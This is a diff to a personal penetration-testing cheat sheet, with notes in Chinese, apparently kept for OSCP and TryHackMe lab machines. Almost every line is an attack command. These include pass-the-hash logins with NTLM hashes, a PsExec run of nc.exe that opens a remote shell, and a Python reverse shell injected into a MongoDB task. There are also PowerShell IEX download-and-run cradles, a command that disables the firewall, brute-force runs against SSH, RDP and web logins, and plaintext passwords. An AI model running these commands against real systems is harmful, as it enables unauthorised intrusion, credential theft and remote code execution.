@@ -10,7 +10,8 @@
 10.弱密碼手動嘗試所有服務ssh,ftp,web,samba (admin,admin)
 11.手動嘗試所有服務ssh,ftp,web,samba有無寫入權
 12.windows指令TryHackMe的Powershell_Scripting
-
+13.查找LFI及RFI
+14. user-agent,searchengine參考10.11.1.39,Inclusiveness
 
 
 
@@ -42,7 +43,11 @@ xfreerdp /u:dark /p:_QuejVudId6 /cert:ignore /v:10.10.213.62    /workarea
 python3 ./psexec.py  mayor:'8CL7O1N78MdrCIsV'@10.10.101.105
 rdesktop -a 16 -z -u Administrator  -p 'BHN2UVw0Q' 10.10.74.171                                                                                                                                                         130 ⨯
 xfreerdp /u:Administrator /p:BHN2UVw0Q /cert:ignore /v:10.10.74.171    /workarea
-
+pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.20 cmd
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.0.22 cmd
+psexec.py alice:al*******@127.0.0.1 -port 445
+python3 ./psexec.py -hashes b7xxxxx:b7xxxxx alice@127.0.0.1 -port 6666
+PsExec.exe /accepteula -u alice -p aliceishere "C:\nc.exe" -nv 10.11.1.50 135 -e cmd.exe
 
 
 ###windows reverse shell
@@ -58,7 +63,7 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 不做互動式 mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
 PostgreSQL數據庫 psql -h 192.168.69.56 -U postgres -p 5432
 PostgreSQL數據庫 psql -h 192.168.199.47 -U postgres -p 5437 默認密碼postgres
-
+MS-SQL   sqsh -S 10.11.1.31 -U sa -P poiuytrewq
 MS-DB sqsh -S 10.129.1.183 -U sa -P GWE3V65#6KFH93@4GWTG2G
 mongo -u mark -p 5AYRft73VtFpc84k scheduler
 db.tasks.insert({"cmd":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.26\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")';"})
@@ -70,7 +75,7 @@ db.tasks.insert({"cmd":"python -c 'import socket,subprocess,os;s=socket.socket(s
 .\chisel.exe client 10.10.14.45:9002 R:3306:localhost:3306 R:8888:localhost:8888
 ./chisel server --reverse --port 9002
 ssh -L10000:localhost:10000 agent47@10.10.242.169
-
+plink.exe -ssh -l kali -pw kali -R 192.168.119.134:1234:127.0.0.1:3306 192.168.119.134
 
 ###nfs
 有發現nfs port的會 要showmount查看
@@ -125,6 +130,11 @@ hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.63.174 http-post-form
 wpscan --url whoisrobot.com --usernames Elliot --passwords /home/kali/timmy/TryHackMe/Mr_Robot/fsocity.dic --max-threads 50
 wpscan --url sunset-midnight --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50 --max-threads 50
 wpscan --url http://10.10.222.171/ --disable-tls-checks --enumerate u --api-token yebWdQNmyXU7oApKQatIaLPe5NL0EkYTjuSunpp5DIU
+medusa -h 10.11.1.22 -u tris -P /usr/share/wordlists/rockyou.txt -M http-m DIR:/admin
+ncrack -u adam -P /usr/share/wordlists/rockyou.txt -p 3389 10.11.1.22
+
+
+
 
 
 ###ssh key 密碼破解
@@ -168,10 +178,16 @@ vim -r auth.php.swp
 zip2john hash64d > zippasshash
 
 
-windows下載檔案
+####windows下載檔案
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.204/reverse.exe','reverse.exe')"
 powershell IEX (New-Object Net.WebClient).DownloadString('http://10.9.0.204/Invoke-PowerShellTcp.ps1')
 certutil.exe -urlcache -split -f http://10.9.0.204/SeatbeltNet3.5x64.exe SeatbeltNet3.5x64.exe
 powershell IEX(New-Object Net.Webclient).downloadstring('http://10.9.0.204/Sherlock.ps1')
 iex ​(New-Object Net.WebClient).DownloadString('http://10.9.2.71/PowerUp.ps1')
 IEX(New-Object Net.Webclient).downloadstring('http://10.9.2.71/Sherlock.ps1')
+
+###windows關閉防火牆
+netsh firewall set opmode mode=disable
+
+###查看samba 139 port版本
+###nc 檢查110 25服務是否為JAMES POP3 Server
